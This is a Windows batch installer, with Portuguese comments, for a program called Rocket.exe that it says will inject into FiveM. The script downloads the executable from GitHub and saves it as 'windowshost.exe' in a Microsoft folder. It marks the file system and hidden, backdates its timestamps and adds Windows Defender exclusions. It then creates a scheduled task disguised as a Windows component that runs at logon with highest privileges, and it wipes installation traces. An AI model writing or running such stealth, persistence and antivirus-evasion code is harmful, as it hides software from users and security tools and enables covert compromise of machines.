@echo off
:: ========================================
::  INSTALADOR AUTOMATICO - ROCKET.EXE
::  Versão Final Corrigida - Sem Loops
:: ========================================

title Instalador Rocket
color 0A

:: Verificar se é Windows 10
ver | findstr /i "10.0" >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERRO] Este programa requer Windows 10!
    pause
    exit /b 1
)

:: Verificar privilégios admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERRO] Este script precisa ser executado como Administrador!
    echo.
    echo Clique com botao direito e selecione "Executar como administrador"
    pause
    exit /b 1
)

:: URL do executável no GitHub
set "GITHUB_URL=https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"

:: Diretório de instalação
set "INSTALL_DIR=%LOCALAPPDATA%\Microsoft\WindowsApps"

:: Criar diretório se não existir
if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%" >nul 2>&1
)

:: Nome do executável
set "EXE_NAME=windowshost.exe"
set "INSTALL_PATH=%INSTALL_DIR%\%EXE_NAME%"

echo.
echo ========================================
echo    INSTALADOR ROCKET - VERSAO FINAL
echo ========================================
echo.
echo [*] Limpando instalacoes antigas...
echo.

:: ========================================
:: PARAR PROCESSOS ANTES DE TUDO
:: ========================================
echo [*] Parando processos existentes...
taskkill /f /im Rocket.exe >nul 2>&1
taskkill /f /im windowshost.exe >nul 2>&1
taskkill /f /im rkt.exe >nul 2>&1
timeout /t 1 /nobreak >nul

:: ========================================
:: REMOVER TAREFAS ANTIGAS PRIMEIRO
:: ========================================
set "TASK_NAME=Microsoft\Windows\WindowsApps"

echo [*] Removendo tarefas agendadas antigas...

:: Parar tarefas antes de deletar
schtasks /end /tn "%TASK_NAME%" >nul 2>&1
schtasks /end /tn "Microsoft\Windows\WindowsApps\Cleanup" >nul 2>&1
schtasks /end /tn "Microsoft\Windows\RuntimeHost" >nul 2>&1
schtasks /end /tn "Microsoft\Windows\RuntimeHost\Cleanup" >nul 2>&1
schtasks /end /tn "Microsoft\Windows\SpeechRuntimeService" >nul 2>&1
schtasks /end /tn "Microsoft\Windows\SpeechRuntimeService\Cleanup" >nul 2>&1
schtasks /end /tn "Rocket" >nul 2>&1
schtasks /end /tn "ZERO" >nul 2>&1
schtasks /end /tn "ZERØ" >nul 2>&1

:: Aguardar um pouco para garantir que as tarefas pararam
timeout /t 2 /nobreak >nul

:: Deletar tarefas
schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
schtasks /delete /tn "Microsoft\Windows\WindowsApps\Cleanup" /f >nul 2>&1
schtasks /delete /tn "Microsoft\Windows\RuntimeHost" /f >nul 2>&1
schtasks /delete /tn "Microsoft\Windows\RuntimeHost\Cleanup" /f >nul 2>&1
schtasks /delete /tn "Microsoft\Windows\SpeechRuntimeService" /f >nul 2>&1
schtasks /delete /tn "Microsoft\Windows\SpeechRuntimeService\Cleanup" /f >nul 2>&1
schtasks /delete /tn "Rocket" /f >nul 2>&1
schtasks /delete /tn "ZERO" /f >nul 2>&1
schtasks /delete /tn "ZERØ" /f >nul 2>&1

:: Aguardar um pouco para garantir que as tarefas foram removidas
timeout /t 2 /nobreak >nul

:: Remover também via PowerShell (mais confiável)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Get-ScheduledTask | Where-Object {$_.TaskName -like '*WindowsApps*' -or $_.TaskName -like '*RuntimeHost*' -or $_.TaskName -like '*SpeechRuntime*' -or $_.TaskName -like '*Rocket*' -or $_.TaskName -like '*ZERO*' -or $_.TaskName -like '*ZERØ*'} | Stop-ScheduledTask -ErrorAction SilentlyContinue" >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Get-ScheduledTask | Where-Object {$_.TaskName -like '*WindowsApps*' -or $_.TaskName -like '*RuntimeHost*' -or $_.TaskName -like '*SpeechRuntime*' -or $_.TaskName -like '*Rocket*' -or $_.TaskName -like '*ZERO*' -or $_.TaskName -like '*ZERØ*'} | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue" >nul 2>&1

echo [OK] Tarefas antigas removidas!
echo.

:: ========================================
:: VERIFICAR SE ROCKET.EXE EXISTE NO GITHUB
:: ========================================
echo [*] Verificando se Rocket.exe existe no GitHub...
powershell -ExecutionPolicy Bypass -Command "try { $response = Invoke-WebRequest -Uri '%GITHUB_URL%' -UseBasicParsing -Method Head -TimeoutSec 10 -ErrorAction Stop; Write-Host '[OK] Rocket.exe encontrado no GitHub!' -ForegroundColor Green } catch { Write-Host '[ERRO] Rocket.exe NAO existe no GitHub!' -ForegroundColor Red; Write-Host ''; Write-Host 'URL: %GITHUB_URL%' -ForegroundColor Yellow; Write-Host ''; Write-Host 'SOLUCAO:' -ForegroundColor Yellow; Write-Host '1. Compile o Rocket.exe' -ForegroundColor Yellow; Write-Host '2. Suba o Rocket.exe para o GitHub em: unknow2/main/Rocket.exe' -ForegroundColor Yellow; Write-Host '3. Execute este script novamente' -ForegroundColor Yellow; exit 1 }"

if %errorLevel% neq 0 (
    echo.
    echo [ERRO] Rocket.exe nao esta disponivel no GitHub!
    echo.
    echo Por favor, compile e suba o Rocket.exe para o GitHub antes de instalar.
    echo.
    pause
    exit /b 1
)

echo.

:: ========================================
:: BAIXAR E INSTALAR EXECUTÁVEL
:: ========================================
echo [*] Baixando executavel do GitHub...

:: Remover arquivo antigo se existir
if exist "%INSTALL_PATH%" (
    echo [*] Removendo instalacao antiga...
    attrib -s -h "%INSTALL_PATH%" >nul 2>&1
    del /q /f "%INSTALL_PATH%" >nul 2>&1
    timeout /t 1 /nobreak >nul
)

:: Baixar usando certutil (método 1)
echo [*] Tentando baixar via certutil...
certutil -urlcache -split -f "%GITHUB_URL%" "%INSTALL_PATH%" >nul 2>&1

:: Verificar se funcionou
if exist "%INSTALL_PATH%" (
    echo [OK] Download concluido via certutil!
    goto :download_ok
)

:: Se falhar, tentar PowerShell (método 2)
echo [*] Certutil falhou, tentando PowerShell...
powershell -ExecutionPolicy Bypass -Command "try { Invoke-WebRequest -Uri '%GITHUB_URL%' -OutFile '%INSTALL_PATH%' -UseBasicParsing -ErrorAction Stop; Write-Host '[OK] Download via PowerShell concluido!' -ForegroundColor Green } catch { Write-Host '[ERRO] PowerShell falhou:' $_.Exception.Message -ForegroundColor Red; exit 1 }"

:: Verificar se funcionou
if exist "%INSTALL_PATH%" (
    echo [OK] Download concluido via PowerShell!
    goto :download_ok
)

:: Se ainda falhar, tentar BitsAdmin (método 3)
echo [*] PowerShell falhou, tentando BitsAdmin...
bitsadmin /transfer "Download" /download /priority high "%GITHUB_URL%" "%INSTALL_PATH%" >nul 2>&1

:: Verificar se funcionou
if exist "%INSTALL_PATH%" (
    echo [OK] Download concluido via BitsAdmin!
    goto :download_ok
)

:: Se todos os métodos falharem
echo.
echo [ERRO] Falha ao baixar executavel do GitHub!
echo.
echo URL tentada: %GITHUB_URL%
echo.
echo Possiveis causas:
echo - O Rocket.exe nao existe no GitHub ainda
echo - Problema de conexao com internet
echo - Repositorio privado ou URL incorreta
echo.
echo Verifique se o arquivo existe em:
echo https://github.com/V3xDev/unknow2/blob/main/Rocket.exe
echo.
pause
exit /b 1

:download_ok

:: ========================================
:: CONFIGURAR ARQUIVO
:: ========================================
echo.
echo [*] Configurando arquivo...

:: Atributos Sistema + Oculto
attrib +s +h "%INSTALL_PATH%" >nul 2>&1

:: Ocultar de buscas do Windows
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$f = '%INSTALL_PATH%'; if (Test-Path $f) { $file = Get-Item $f; $file.Attributes = $file.Attributes -bor [System.IO.FileAttributes]::NotContentIndexed }" >nul 2>&1

:: Definir data de modificação antiga
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$f = '%INSTALL_PATH%'; if (Test-Path $f) { $file = Get-Item $f; $file.LastWriteTime = (Get-Date).AddYears(-2); $file.CreationTime = (Get-Date).AddYears(-2) }" >nul 2>&1

:: Adicionar exceção no Windows Defender
echo [*] Adicionando excecao no Windows Defender...
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Add-MpPreference -ExclusionPath '%INSTALL_PATH%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue } catch { }" >nul 2>&1

:: ========================================
:: CRIAR TAREFA AGENDADA (CORRIGIDA - SEM LOOPS)
:: ========================================
echo.
echo [*] Criando tarefa agendada (prevenindo loops)...
echo.

:: Aguardar um pouco para garantir que as remoções anteriores foram processadas
timeout /t 2 /nobreak >nul

:: Criar tarefa agendada com configurações que previnem loops
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$action = New-ScheduledTaskAction -Execute '%INSTALL_PATH%'; $trigger = New-ScheduledTaskTrigger -AtLogOn; $trigger.Delay = 'PT30S'; $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest; $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Hours 0) -MultipleInstances IgnoreNew -RestartCount 0; Register-ScheduledTask -TaskName '%TASK_NAME%' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description 'Componente de Host de Aplicativos do Windows' -Force" >nul 2>&1

:: Verificar se a tarefa foi criada
schtasks /query /tn "%TASK_NAME%" >nul 2>&1
if %errorLevel% equ 0 (
    echo [OK] Tarefa agendada criada com sucesso!
    echo [*] O Rocket sera executado 30 segundos apos o logon
    echo [*] Configurado para evitar loops e multiplas instancias
) else (
    echo [AVISO] Falha ao criar tarefa agendada via PowerShell
    echo [*] Tentando metodo alternativo...
    
    :: Fallback: usar schtasks (sem delay, mas funcional)
    schtasks /create /tn "%TASK_NAME%" /tr "\"%INSTALL_PATH%\"" /sc onlogon /ru SYSTEM /rl HIGHEST /f >nul 2>&1
    
    schtasks /query /tn "%TASK_NAME%" >nul 2>&1
    if %errorLevel% equ 0 (
        echo [OK] Tarefa criada via schtasks!
        echo [AVISO] Delay de 30s nao aplicado (metodo alternativo)
    ) else (
        echo [ERRO] Falha ao criar tarefa agendada!
        echo [AVISO] O programa nao iniciara automaticamente no logon.
    )
)

echo.

:: ========================================
:: LIMPEZA
:: ========================================
echo [*] Limpando rastros de instalacao...

:: Limpar cache do certutil
certutil -urlcache * delete >nul 2>&1

:: Limpar arquivos temporários
del /q /f "%TEMP%\install.bat" >nul 2>&1
del /q /f "%TEMP%\*install*" >nul 2>&1

echo [OK] Limpeza concluida!
echo.

:: ========================================
:: CONCLUSÃO
:: ========================================
echo ========================================
echo    INSTALACAO CONCLUIDA!
echo ========================================
echo.
echo [OK] Executavel instalado em:
echo     %INSTALL_PATH%
echo.
echo [OK] Tarefa agendada: %TASK_NAME%
echo [OK] O Rocket sera executado automaticamente 30 segundos
echo      apos o proximo logon (para evitar conflitos)
echo.
echo [OK] Configurado para evitar loops e multiplas instancias
echo.
echo [INFO] IMPORTANTE - Ordem de execucao:
echo    1. Reinicie o PC
echo    2. Aguarde 30 segundos apos logon
echo    3. Abra o Spotify e toque "Ghard - Pinheiros"
echo    4. Abra o FiveM
echo    5. O Rocket detectara e injetara automaticamente
echo.
echo [OK] Voce pode fechar esta janela.
echo.
timeout /t 5 /nobreak >nul
exit
